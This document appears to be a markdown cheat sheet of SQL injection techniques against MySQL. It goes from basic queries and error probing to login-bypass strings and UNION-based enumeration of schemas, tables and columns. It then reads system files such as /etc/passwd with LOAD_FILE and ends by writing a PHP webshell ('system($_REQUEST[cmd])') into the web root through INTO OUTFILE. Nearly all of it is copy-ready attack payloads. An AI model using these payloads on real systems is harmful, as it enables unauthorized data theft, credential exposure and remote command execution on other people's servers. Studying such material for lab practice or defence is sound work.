# SQLi

## MySQL Basics

### Connect to a MySQL Database
```zsh
mysql -u <user> -h <host> -P <port> -p<pass>
```

### Enumerate Databases
```MySQL
SHOW Databases;
```
```MySQL
USE <database>;
```

### Enumerate Tables
```MySQL
SHOW TABLES;
```

```MySQL
DESCRIBE <table>;
```

### Retrieve Data
```MySQL
SELECT * FROM <table>;
```

```MySQL
SELECT <column1>,<column2> FROM <table>;
```

```MySQL
SELECT <column1>,<column2> FROM <table> ORDER BY <column2>;
```

```MySQL
SELECT <column1>,<column2> FROM <table> WHERE <condition>;
```

## SQL Injection
### Check for errors with:
```MySQL
'
```
```MySQL
"
```
```MySQL
#
```
```MySQL
;
```
```MySQL
)
```

### Bypassing a Log in Portal
```MySQL
admin' OR '1'='1
```
```MySQL
admin'-- 
```

### Using a UNION Clause
Remove or add from "2, 3, 4" as needed because the columns need to be "even"
```MySQL
SELECT * from <table> where <column> = '1' UNION SELECT username, 2, 3, 4 from passwords-- '
```

### Detecting the Number of Columns
```MySQL
' order by n-- 
```
where n is the max value that does not cause an error.


-or-

```MySQL
' UNION select 1,2,3-- 
```

### Locating Output
A webapp may or may not display the results of each column. Take note of where the locations of the 1, 2, or 3 are.

### Fingerprinting MySQL Database
#### Current Database
```MySQL
' UNION select 1,database(),2,3-- 
```

#### Find other Databases
```MySQL
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
or
```MySQL
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
```

#### Enumerate Tables
```MySQL
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<database>'-- 
```

#### Enumerate Columns
```MySQL
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'-- 
```

#### Extract Data
```MySQL
' UNION select 1, column1, column2, 4 from <database>.<table>-- 
```

### Read Files
#### Determine User
```MySQL
SELECT USER()
```
```MySQL
SELECT CURRENT_USER()
```
```MySQL
SELECT user from mysql.user
```
```MySQL
SELECT user from mysql.user
```
```MySQL
' UNION SELECT 1, user(), 3, 4-- -
```
```MySQL
' UNION SELECT 1, user, 3, 4 from mysql.user-- 
```
#### Determine Privileges
```Mysql
SELECT super_priv FROM mysql.user
```
```MySQL
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 
```
Find the permissions of a particular user
```MySQL
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- 
```
```Mysql
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
```
```MySQL
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- 
```
We Are looking for the FILE Privilege. THis means that we can potentially read and write files.

#### Load FIle
```MySQL
SELECT LOAD_FILE('/etc/passwd');
```
```MySQL
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
```
We can even get the source code of files if we know the web root.
```MySQL
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- 
```

### Writing Files
#### See Read Files for FILE Privilege
#### secure_file_priv
```MySQL
SHOW VARIABLES LIKE 'secure_file_priv';
```
```MySQL
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
```MySQL
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 
```
#### SELECT INTO OUTFILE
```MySQL
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
```MySQL
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
```MySQL
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```
```MySQL
' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- 
```
Webroots can be found:
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
%WinDir%\System32\Inetsrv\Config\ApplicationHost.config
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt

#### Writing a webshell
The webshell:
```php
<?php system($_REQUEST[cmd]); ?>
```
```MySQL
' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
```
#### Access the webshell
Go to the webshell by going to <IP:PORT>/shell.php?cmd=<command>
